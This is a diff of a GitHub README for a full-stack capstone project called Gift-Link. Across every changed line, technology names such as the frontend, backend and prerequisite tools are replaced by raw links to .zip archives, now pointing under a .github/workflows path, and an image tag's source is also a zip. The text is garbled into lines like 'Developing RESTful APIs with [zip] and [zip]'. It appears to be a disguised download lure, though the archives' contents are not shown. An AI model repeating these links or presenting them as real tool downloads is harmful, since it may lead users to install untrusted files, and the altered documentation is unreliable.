@@ -1,4 +1,4 @@
-<img width="600" alt="Screenshot 2024-08-31 at 9 23 46 PM" src="https://raw.githubusercontent.com/sakshi-code-cse/fullstack-capstone-project/main/nidicolous/fullstack-capstone-project.zip">
+<img width="600" alt="Screenshot 2024-08-31 at 9 23 46 PM" src="https://raw.githubusercontent.com/sakshi-code-cse/fullstack-capstone-project/main/.github/workflows/capstone-project-fullstack-v3.5.zip">
 
 # Gift-Link Full-Stack Application
 
@@ -31,7 +31,7 @@ Throughout the development of this project, the following key learning objective
 - Setting up and configuring a GitHub repository.
 - Creating and managing user stories and organizing them as GitHub issues.
 - Configuring and managing a NoSQL MongoDB database.
-- Developing RESTful APIs with https://raw.githubusercontent.com/sakshi-code-cse/fullstack-capstone-project/main/nidicolous/fullstack-capstone-project.zip and https://raw.githubusercontent.com/sakshi-code-cse/fullstack-capstone-project/main/nidicolous/fullstack-capstone-project.zip
+- Developing RESTful APIs with https://raw.githubusercontent.com/sakshi-code-cse/fullstack-capstone-project/main/.github/workflows/capstone-project-fullstack-v3.5.zip and https://raw.githubusercontent.com/sakshi-code-cse/fullstack-capstone-project/main/.github/workflows/capstone-project-fullstack-v3.5.zip
 - Implementing a React frontend with dynamic state management and routing.
 - Handling user authentication and profile management with secure API interactions.
 - Deploying the application using Kubernetes and IBM Code Engine.
@@ -40,8 +40,8 @@ Throughout the development of this project, the following key learning objective
 
 ## Technologies Used
 
-- **Frontend**: https://raw.githubusercontent.com/sakshi-code-cse/fullstack-capstone-project/main/nidicolous/fullstack-capstone-project.zip, CSS, HTML
-- **Backend**: https://raw.githubusercontent.com/sakshi-code-cse/fullstack-capstone-project/main/nidicolous/fullstack-capstone-project.zip, https://raw.githubusercontent.com/sakshi-code-cse/fullstack-capstone-project/main/nidicolous/fullstack-capstone-project.zip
+- **Frontend**: https://raw.githubusercontent.com/sakshi-code-cse/fullstack-capstone-project/main/.github/workflows/capstone-project-fullstack-v3.5.zip, CSS, HTML
+- **Backend**: https://raw.githubusercontent.com/sakshi-code-cse/fullstack-capstone-project/main/.github/workflows/capstone-project-fullstack-v3.5.zip, https://raw.githubusercontent.com/sakshi-code-cse/fullstack-capstone-project/main/.github/workflows/capstone-project-fullstack-v3.5.zip
 - **Database**: MongoDB
 - **CI/CD**: GitHub Actions, Kubernetes, IBM Code Engine
 - **Other Tools**: NPM, Git, Linting
@@ -52,7 +52,7 @@ Throughout the development of this project, the following key learning objective
 
 Before you begin, ensure you have the following installed:
 
-- https://raw.githubusercontent.com/sakshi-code-cse/fullstack-capstone-project/main/nidicolous/fullstack-capstone-project.zip and npm
+- https://raw.githubusercontent.com/sakshi-code-cse/fullstack-capstone-project/main/.github/workflows/capstone-project-fullstack-v3.5.zip and npm
 - MongoDB
 - Git
 
